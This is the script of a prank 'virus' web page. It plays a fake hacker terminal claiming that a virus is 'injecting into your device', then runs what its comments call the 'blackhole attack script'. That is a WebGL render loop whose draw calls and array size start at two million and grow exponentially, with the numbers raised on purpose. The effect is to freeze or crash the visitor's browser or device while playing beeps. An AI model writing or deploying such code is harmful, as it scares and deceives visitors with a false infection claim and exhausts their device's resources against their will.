// script.js
const startBtn = document.getElementById('start-btn');
const startScreen = document.getElementById('start-screen');
const warningPopup = document.getElementById('warning-popup');
const closeBtn = document.getElementById('close-btn');
const countdownEl = document.getElementById('countdown');
const terminalScreen = document.getElementById('terminal-screen');
const terminalOutput = document.getElementById('terminal-output');
const loadingBarContainer = document.getElementById('loading-bar-container');
const loadingBar = document.getElementById('loading-bar');

// Exact string you requested
const authorLine = "This Virus Injecting Into Your Device By TSun A Organization By ༯𝙎ค૯𝙀𝘿✘🫀";

// Fake commands
const fakeCommands = [
  "root@blackhole:~$ running injection module 𓂀",
  "root@blackhole:~$ opening secure channels ...",
  "root@blackhole:~$ writing payload fragments ...",
  "root@blackhole:~$ synchronizing fragments ...",
  "root@blackhole:~$ executing final handshake ..."
];

// Utility helpers
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

async function typeIntoTerminal(text, totalDuration, cssClass = "term-line") {
  const el = document.createElement('div');
  el.className = cssClass;
  terminalOutput.appendChild(el);
  const chars = Array.from(text);
  const interval = Math.max(8, Math.floor(totalDuration / chars.length));
  for (let i = 0; i < chars.length; i++) {
    el.textContent += chars[i];
    await sleep(interval);
  }
  return el;
}

async function deleteBackward(el, totalDuration) {
  const chars = Array.from(el.textContent);
  if (chars.length === 0) return;
  const interval = Math.max(8, Math.floor(totalDuration / chars.length));
  for (let i = chars.length; i > 0; i--) {
    el.textContent = el.textContent.slice(0, i - 1);
    await sleep(interval);
  }
  el.remove();
}

// Play the intro sequence
async function playSequence() {
  terminalOutput.innerHTML = '';
  const hiEl = await typeIntoTerminal(authorLine, 5000, 'hi-line');
  await sleep(5000);
  await deleteBackward(hiEl, 3000);

  const startTime = performance.now();
  let cmdIndex = 0;
  while ((performance.now() - startTime) < 5000) {
    const cmd = fakeCommands[cmdIndex % fakeCommands.length];
    await typeIntoTerminal(cmd, 450, 'term-line');
    await sleep(350);
    cmdIndex++;
    terminalOutput.scrollTop = terminalOutput.scrollHeight;
  }

  loadingBarContainer.style.display = 'block';
  loadingBar.style.transition = 'width 5s linear';
  await sleep(50);
  loadingBar.style.width = '100%';
  await sleep(5000);

  // Sequence finished, hide terminal and start the main attack
  terminalScreen.style.display = 'none';
  render(); // <<< THIS IS THE MAGIC KEY!
}

function showWarningPopup() {
  warningPopup.style.display = 'flex';
  let countdown = 3;
  countdownEl.textContent = countdown;
  const timer = setInterval(() => {
    countdown--;
    countdownEl.textContent = countdown;
    if (countdown <= 0) {
      clearInterval(timer);
      countdownEl.style.display = 'none';
      closeBtn.style.display = 'block';
    }
  }, 1000);
}

// Hook up start button
startBtn.addEventListener('click', async () => {
  startScreen.style.display = 'none';
  showWarningPopup();
});

// Hook up close button
closeBtn.addEventListener('click', () => {
  warningPopup.style.display = 'none';
  terminalScreen.style.display = 'flex';
  loadingBarContainer.style.display = 'none';
  loadingBar.style.width = '0%';
  playSequence();
});


// =====================================================================
// == RENDER() FUNCTION - CONTAINS THE ENTIRE BLACKHOLE ATTACK SCRIPT ==
// =====================================================================
function render() {
  const canvas = document.getElementById("glcanvas");
  const gl = canvas.getContext("webgl");
  const infoElement = document.getElementById("info");

  // Make canvas and info visible
  canvas.style.display = 'block';
  infoElement.style.display = 'block';

  let audioContext;
  let oscillator;
  let gainNode;
  let interaction = 0;
  let mouseX = 0;
  let mouseY = 0;
  let isInteracting = false;

  function setupCanvas() {
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;
    window.addEventListener('resize', function() {
      canvas.width = window.innerWidth;
      canvas.height = window.innerHeight;
    });
    canvas.addEventListener('mousedown', startInteraction);
    canvas.addEventListener('mousemove', handleMove);
    canvas.addEventListener('mouseup', endInteraction);
    canvas.addEventListener('mouseleave', endInteraction);
    canvas.addEventListener('touchstart', (e) => {
      e.preventDefault();
      startInteraction(e.touches[0]);
    });
    canvas.addEventListener('touchmove', (e) => {
      e.preventDefault();
      handleMove(e.touches[0]);
    });
    canvas.addEventListener('touchend', endInteraction);
    document.addEventListener('click', initAudioContext, { once: true });
    document.addEventListener('touchstart', initAudioContext, { once: true });
  }

  function initAudioContext() {
    audioContext = new(window.AudioContext || window.webkitAudioContext)();
    gainNode = audioContext.createGain();
    gainNode.gain.value = 0;
    gainNode.connect(audioContext.destination);
  }

  function playBeep(fps) {
    if (!audioContext) return;
    if (oscillator) {
      oscillator.stop();
    }
    oscillator = audioContext.createOscillator();
    oscillator.type = 'sine';
    const minFPS = 10;
    const maxFPS = 60;
    const clampedFPS = Math.max(minFPS, Math.min(fps, maxFPS));
    const freq = 300 + (clampedFPS / maxFPS) * 1200;
    oscillator.frequency.value = freq;
    const volume = 0.1 + (1 - (clampedFPS / maxFPS)) * 0.4;
    gainNode.gain.value = volume;
    oscillator.connect(gainNode);
    oscillator.stop(audioContext.currentTime + 0.05);
  }

  function startInteraction(e) {
    isInteracting = true;
    mouseX = e.clientX;
    mouseY = e.clientY;
  }

  function handleMove(e) {
    if (isInteracting) {
      mouseX = e.clientX;
      mouseY = e.clientY;
      interaction = 1.0;
    }
  }

  function endInteraction() {
    isInteracting = false;
  }
  setupCanvas();
  const fragShaderSource = document.getElementById("fragShader").textContent;

  function createShader(gl, type, source) {
    const shader = gl.createShader(type);
    gl.shaderSource(shader, source);
    gl.compileShader(shader);
    if (!gl.getShaderParameter(shader, gl.COMPILE_STATUS)) {
      console.error('(1) Shader compilation failure:', gl.getShaderInfoLog(shader));
      throw new Error(gl.getShaderInfoLog(shader));
    }
    return shader;
  }

  function createProgram(gl, fragShaderSource) {
    const vertShaderSource = `attribute vec4 position; void main() { gl_Position = position; }`;
    const vs = createShader(gl, gl.VERTEX_SHADER, vertShaderSource);
    const fs = createShader(gl, gl.FRAGMENT_SHADER, fragShaderSource);
    const program = gl.createProgram();
    gl.attachShader(program, vs);
    gl.attachShader(program, fs);
    gl.linkProgram(program);
    if (!gl.getProgramParameter(program, gl.LINK_STATUS)) {
      console.error('(2) Program linking failure:', gl.getProgramInfoLog(program));
      throw new Error(gl.getProgramInfoLog(program));
    }
    return program;
  }
  const program = createProgram(gl, fragShaderSource);
  const positionAttribute = gl.getAttribLocation(program, "position");
  const buffer = gl.createBuffer();

  function setupBuffers() {
    gl.bindBuffer(gl.ARRAY_BUFFER, buffer);
    gl.bufferData(gl.ARRAY_BUFFER, new Float32Array([-1, -1, 1, -1, -1, 1, -1, 1, 1, -1, 1, 1]), gl.STATIC_DRAW);
  }
  setupBuffers();
  const resolutionUniform = gl.getUniformLocation(program, "u_resolution");
  const timeUniform = gl.getUniformLocation(program, "u_time");
  const mouseUniform = gl.getUniformLocation(program, "u_mouse");
  const interactionUniform = gl.getUniformLocation(program, "u_interaction");
  let start = performance.now();
  let instances = [];
  let lastTime = performance.now();
  let frameCount = 0;
  let fps = 0;
  let frameTimes = [];
  const frameTimeHistoryLength = 60;
  const MIN_INSTANCES = 2000000; // <-- Increased from 1,000,000

  function updateInstances(currentTimeSec) {
    const instanceCount = MIN_INSTANCES * Math.pow(2, currentTimeSec * 0.6); // <-- Increased from 0.5
    instances = [];
    for (let i = 0; i < instanceCount; i++) {
      let offset = currentTimeSec - (i * 0.05);
      instances.push(offset);
    }
  }

  function updateFPS(now) {
    frameCount++;
    if (now - lastTime >= 1000) {
      fps = frameCount;
      frameCount = 0;
      lastTime = now;
      if (fps > 0) {
        playBeep(fps);
      }
    }
    frameTimes.push(performance.now());
    if (frameTimes.length > frameTimeHistoryLength) {
      frameTimes.shift();
    }
  }

  function updateInteraction(deltaTime) {
    if (!isInteracting) {
      interaction = Math.max(0, interaction - deltaTime * 0.5);
    }
  }

  function mainRenderLoop() {
    const now = performance.now();
    const deltaTime = (now - lastTime) / 1000;
    const elapsed = (now - start) / 1000;
    updateFPS(now);
    updateInteraction(deltaTime);
    updateInstances(elapsed);
    gl.viewport(0, 0, canvas.width, canvas.height);
    gl.clear(gl.COLOR_BUFFER_BIT);
    gl.useProgram(program);
    gl.enableVertexAttribArray(positionAttribute);
    gl.bindBuffer(gl.ARRAY_BUFFER, buffer);
    gl.vertexAttribPointer(positionAttribute, 2, gl.FLOAT, false, 0, 0);
    gl.uniform2f(resolutionUniform, canvas.width, canvas.height);
    gl.uniform2f(mouseUniform, mouseX / canvas.width, 1.0 - mouseY / canvas.height);
    gl.uniform1f(interactionUniform, interaction);
    for (let t of instances) {
      gl.uniform1f(timeUniform, t);
      gl.drawArrays(gl.TRIANGLES, 0, 6);
    }
    updateInfoDisplay(elapsed);
    requestAnimationFrame(mainRenderLoop);
  }

  function updateInfoDisplay(elapsed) {
    let avgFrameTime = 0;
    if (frameTimes.length > 1) {
      const totalTime = frameTimes[frameTimes.length - 1] - frameTimes[0];
      avgFrameTime = totalTime / (frameTimes.length - 1);
    }
    infoElement.innerHTML = `${fps}${instances.length}${avgFrameTime.toFixed(2)}${elapsed.toFixed(2)}${canvas.width}${canvas.height}`;
  }
  mainRenderLoop();
}